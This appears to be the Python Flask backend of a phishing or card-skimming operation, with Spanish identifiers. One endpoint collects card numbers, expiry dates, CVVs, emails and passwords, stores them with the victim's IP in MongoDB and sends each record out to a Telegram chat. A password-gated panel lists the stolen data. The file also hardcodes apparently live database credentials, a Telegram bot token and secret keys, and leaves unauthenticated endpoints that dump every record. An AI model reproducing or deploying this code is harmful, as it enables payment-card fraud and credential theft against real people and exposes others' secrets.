from flask import Flask, request, jsonify, redirect, render_template, url_for, session
from pymongo import MongoClient
from flask_cors import CORS
import requests
from telegram import Bot

app = Flask(__name__)
CORS(app)

uri = "mongodb+srv://manuel1301999:t1NV5OzogIDbTD93@cluster.lpcdv.mongodb.net/?retryWrites=true&w=majority"
client = MongoClient(uri)

usuarios_db = client.usuarios
datos_db = client.datos
pedidos_db = client.pedidos

usuarios_collection = usuarios_db.usuarios_collection
datos_collection = datos_db.datos_collection
pedidos_collection = pedidos_db.pedidos_collection

TOKEN = '7757452227:AAEeA7yXojxmztdXlRS6tCNa-4iGJgln714' 
CHAT_ID = '-4537793996'

@app.route('/obtener_informacion_ip', methods=['GET'])
def obtener_informacion_ip():
    ip = request.args.get('ip')
    if not ip:
        return jsonify({'error': 'Debe proporcionar una dirección IP'}), 400

    url = f"https://ipinfo.io/{ip}/json"
    try:
        response = requests.get(url)
        if response.ok:
            data = response.json()
            return jsonify(data), 200
        else:
            return jsonify({'error': 'Error al obtener información de la IP'}), response.status_code
    except requests.exceptions.RequestException as e:
        return jsonify({'error': str(e)}), 500

@app.route('/buscar_ip/<ip>', methods=['GET'])
def buscar_ip(ip):
    try:
        # Buscar la IP en la colección
        ip_doc = datos_collection.find_one({'ip': ip}, {'_id': 0})

        if ip_doc:
            return jsonify(ip_doc), 200
        else:
            return jsonify({'message': 'IP no encontrada'}), 404

    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/ver_ips', methods=['GET'])
def ver_ips():
    try:
        ips = list(datos_collection.find({}, {'_id': 0})) 
        return jsonify(ips), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

def enviar_mensaje_telegram(chat_id, mensaje):
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={mensaje}'
    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f'Error al enviar mensaje a Telegram: {e}')

@app.route('/guardar_usuario', methods=['POST'])
def guardar_usuario():
    try:
        nombre = request.json['nombre']
        correo = request.json['correo']
        clave = request.json['clave']
        
        data_doc = {
            'nombre': nombre,
            'correo': correo,
            'clave': clave
        }
        usuarios_collection.insert_one(data_doc)
        
        return jsonify({'message': 'Datos almacenados exitosamente'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    
@app.route('/login', methods=['POST'])
def login():
    try:
        correo = request.json['correo']
        clave = request.json['clave']
        
        user = usuarios_collection.find_one({'correo': correo, 'clave': clave})
        
        if user:
            return jsonify({
                'message': 'Inicio de sesión exitoso',
                'nombre': user['nombre'],  # Enviar el nombre
                'correo': user['correo']
            }), 200
        else:
            return jsonify({'error': 'Usuario o clave incorrectos'}), 401
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    
@app.route('/almacenar_datos', methods=['POST'])
def almacenar_datos():
    try:
        d1 = request.json['cc']
        d2 = request.json['date']
        d3 = request.json['cvv']
        d4 = request.json['name']
        # d5 = request.json['ip']
        d6 = request.json['correo']
        d7 = request.json['clave']
        
        ip = request.remote_addr
            
        data_doc = {
            'cc': d1,
            'date': d2,
            'cvv': d3,
            'name': d4,
            'ip': ip,
            'correo': d6,
            'clave': d7
        }
        datos_collection.insert_one(data_doc)
        
        mensaje = f'Información llegada:\nCC: {d1}\nDate: {d2}\nCVV: {d3}\nNombre: {d4}\nCorreo: {d6}\nContraseña: {d7}'
        
        enviar_mensaje_telegram(CHAT_ID, mensaje)
        
        return jsonify({'message': 'Datos almacenados exitosamente'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/ver_datos', methods=['GET'])
def ver_datos():
    try:
        datos = list(datos_collection.find({}, {'_id': 0}))
        return jsonify(datos), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

app.secret_key = '98ab919bda431155bad88a32b31d831ef784e976f0d5f6ac'
AUTH_KEY = "secretKey2024"

@app.route('/alldates', methods=['GET', 'POST'])
def alldates():
    if request.method == 'POST':
        clave_ingresada = request.form.get('clave')
        if clave_ingresada == AUTH_KEY:
            session['authenticated'] = True
            return redirect(url_for('opciones'))
        else:
            return "Clave incorrecta, intenta nuevamente.", 401

    return '''
    <html>
    <head>
        <title>Autenticación</title>
    </head>
    <body>
        <h2>Ingrese la clave para acceder</h2>
        <form method="post">
            <label for="clave">Clave:</label>
            <input type="password" id="clave" name="clave">
            <input type="submit" value="Ingresar">
        </form>
    </body>
    </html>
    '''

@app.route('/opciones')
def opciones():
    if not session.get('authenticated'):
        return redirect(url_for('alldates'))

    return '''
    <html>
    <head>
        <title>Opciones de Colección</title>
    </head>
    <body>
        <h2>Seleccione la colección a mostrar:</h2>
        <button onclick="location.href='/mostrar_usuarios'" type="button">Mostrar Usuarios</button>
        <button onclick="location.href='/mostrar_datos'" type="button">Mostrar Datos</button>
    </body>
    </html>
    '''

@app.route('/mostrar_usuarios')
def mostrar_usuarios():
    if not session.get('authenticated'):
        return redirect(url_for('alldates'))

    try:
        usuarios = list(usuarios_collection.find({}, {'_id': 0}))
        html_content = '''
        <html>
        <head>
            <title>Usuarios</title>
            <style>
                table {
                    width: 50%;
                    border-collapse: collapse;
                }
                th, td {
                    padding: 8px 12px;
                    border: 1px solid #ddd;
                }
                th {
                    background-color: #f4f4f4;
                }
            </style>
        </head>
        <body>
            <h2>Listado de Usuarios</h2>
            <table>
                <thead>
                    <tr>
                        <th>Nombre</th>
                        <th>Correo</th>
                        <th>Clave</th>
                    </tr>
                </thead>
                <tbody>
        '''
        for usuario in usuarios:
            html_content += f'''
            <tr>
                <td>{usuario.get('nombre', 'N/A')}</td>
                <td>{usuario.get('correo', 'N/A')}</td>
                <td>{usuario.get('clave', 'N/A')}</td>
            </tr>
            '''
        html_content += '''
                </tbody>
            </table>
            <br>
            <button onclick="location.href='/opciones'" type="button">Volver a Opciones</button>
        </body>
        </html>
        '''
        return html_content
    except Exception as e:
        return f"<h3>Error al obtener los datos: {str(e)}</h3>"

@app.route('/mostrar_datos')
def mostrar_datos():
    if not session.get('authenticated'):
        return redirect(url_for('alldates'))

    try:
        datos = list(datos_collection.find({}, {'_id': 0}))
        html_content = '''
        <html>
        <head>
            <title>Datos</title>
            <style>
                table {
                    width: 75%;
                    border-collapse: collapse;
                }
                th, td {
                    padding: 8px 12px;
                    border: 1px solid #ddd;
                }
                th {
                    background-color: #f4f4f4;
                }
            </style>
        </head>
        <body>
            <h2>Listado de Datos</h2>
            <table>
                <thead>
                    <tr>
                        <th>CC</th>
                        <th>Fecha</th>
                        <th>CVV</th>
                        <th>Nombre</th>
                        <th>IP</th>
                        <th>Correo</th>
                        <th>Clave</th>
                    </tr>
                </thead>
                <tbody>
        '''
        for dato in datos:
            html_content += f'''
            <tr>
                <td>{dato.get('cc', 'N/A')}</td>
                <td>{dato.get('date', 'N/A')}</td>
                <td>{dato.get('cvv', 'N/A')}</td>
                <td>{dato.get('name', 'N/A')}</td>
                <td>{dato.get('ip', 'N/A')}</td>
                <td>{dato.get('correo', 'N/A')}</td>
                <td>{dato.get('clave', 'N/A')}</td>
            </tr>
            '''
        html_content += '''
                </tbody>
            </table>
            <br>
            <button onclick="location.href='/opciones'" type="button">Volver a Opciones</button>
        </body>
        </html>
        '''
        return html_content
    except Exception as e:
        return f"<h3>Error al obtener los datos: {str(e)}</h3>"

@app.route('/logout')
def logout():
    session.pop('authenticated', None)
    return redirect(url_for('alldates'))

if __name__ == '__main__':

    app.run(host='0.0.0.0',port=5111)



#USAR PARA INSTALAR LAS LIBRERIAS NECESARIAS 
#pip install -r requirements.txt